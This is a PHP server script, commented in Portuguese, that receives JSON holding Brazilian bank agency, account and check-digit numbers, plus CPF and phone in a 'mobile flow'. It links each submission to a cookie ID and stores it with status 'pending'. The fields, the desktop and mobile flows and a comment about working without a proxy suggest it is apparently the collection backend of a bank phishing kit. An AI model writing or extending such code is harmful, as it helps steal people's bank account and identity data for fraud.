<?php
// File: public/salvar.php
session_start();
header('Content-Type: application/json');
require __DIR__ . '/../includes/db.php';

// Lê dados JSON do corpo da requisição
$rawData = file_get_contents('php://input');
$data = json_decode($rawData, true);
if (!$data) {
    echo json_encode(['success' => false, 'error' => 'JSON malformado']);
    exit;
}

// Extrai todos os dados possíveis. Campos não enviados (ex: 'nome') serão nulos ou vazios.
$nome     = trim($data['nome']    ?? ''); // Pode vir vazio no fluxo do desktop
$agencia  = trim($data['agencia'] ?? '');
$conta    = trim($data['conta']   ?? '');
$digito   = trim($data['digito']  ?? '');
$cpf      = trim($data['cpf']     ?? '');
$telefone = trim($data['celular'] ?? '');
$tipo     = trim($data['tipo']    ?? '');

// --- ✅ AJUSTE PRINCIPAL: VALIDAÇÃO SEM DEPENDER DO PROXY ---
// Valida os campos que são sempre obrigatórios (agência, conta, dígito).
// O campo 'nome' não é mais validado aqui pois não é enviado pelo formulário principal.
if (strlen($agencia) !== 4 || empty($conta) || strlen($digito) !== 1) {
    echo json_encode(['success' => false, 'error' => 'Dados de agência, conta ou dígito são inválidos.']);
    exit;
}

// Verifica se é o fluxo mobile para validação e gravação na sessão depois
$isMobileFlow = !empty($cpf) && !empty($telefone);
if ($isMobileFlow) {
    if (strlen($cpf) !== 11 || strlen($telefone) < 10) {
        echo json_encode(['success' => false, 'error' => 'CPF ou Telefone inválido no fluxo mobile.']);
        exit;
    }
}

// Valida o identificador do cliente
if (empty($_COOKIE['identificador_cliente'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Identificador de cliente ausente']);
    exit;
}
$id = $_COOKIE['identificador_cliente'];

// --- LÓGICA DE BANCO DE DADOS (JÁ ESTÁ FLEXÍVEL E FOI MANTIDA) ---

// Verifica se o cliente já existe para decidir entre INSERT e UPDATE
$stmt = $pdo->prepare("SELECT id FROM clients WHERE identificador_cookie = ?");
$stmt->execute([$id]);
$row = $stmt->fetch();

if ($row) {
    // UPDATE: Cliente já existe
    $clientId = $row['id'];

    $sql_parts = [
        "nome = ?",
        "agencia = ?",
        "conta = ?",
        "digito = ?",
        "status = 'pending'",
        "created_at = NOW()"
    ];
    $params = [$nome, $agencia, $conta, $digito];

    if ($isMobileFlow) {
        $sql_parts[] = "cpf = ?";
        $sql_parts[] = "telefone = ?";
        $params[] = $cpf;
        $params[] = $telefone;
    }

    if (!empty($tipo)) {
        $sql_parts[] = "tipo = ?";
        $params[] = $tipo;
    }

    $sql = "UPDATE clients SET " . implode(", ", $sql_parts) . " WHERE identificador_cookie = ?";
    $params[] = $id;

    $stmt = $pdo->prepare($sql);
    $stmt->execute($params);

} else {
    // INSERT: Cliente não existe
    $columns      = ['nome', 'agencia', 'conta', 'digito', 'identificador_cookie'];
    $placeholders = ['?', '?', '?', '?', '?'];
    $params       = [$nome, $agencia, $conta, $digito, $id];

    if ($isMobileFlow) {
        $columns[]      = 'cpf';
        $columns[]      = 'telefone';
        $placeholders[] = '?';
        $placeholders[] = '?';
        $params[]       = $cpf;
        $params[]       = $telefone;
    }

    if (!empty($tipo)) {
        $columns[]      = 'tipo';
        $placeholders[] = '?';
        $params[]       = $tipo;
    }

    $sql = "INSERT INTO clients (" . implode(", ", $columns) . ", status, created_at) VALUES (" . implode(", ", $placeholders) . ", 'pending', NOW())";

    $stmt = $pdo->prepare($sql);
    $stmt->execute($params);
    $clientId = $pdo->lastInsertId();
}

// --- Grava os dados na sessão ---
$_SESSION['client_id'] = $clientId;
$_SESSION['agencia']   = $agencia;
$_SESSION['conta']     = $conta;
$_SESSION['digito']    = $digito;

// Grava dados na sessão apenas se eles foram recebidos
if (!empty($nome)) {
    $_SESSION['nome'] = $nome;
}
if ($isMobileFlow) {
    $_SESSION['cpf']      = $cpf;
    $_SESSION['telefone'] = $telefone;
}
if (!empty($tipo)) {
    $_SESSION['tipo'] = $tipo;
}

// Retorna sucesso
echo json_encode(['success' => true, 'client_id' => $clientId]);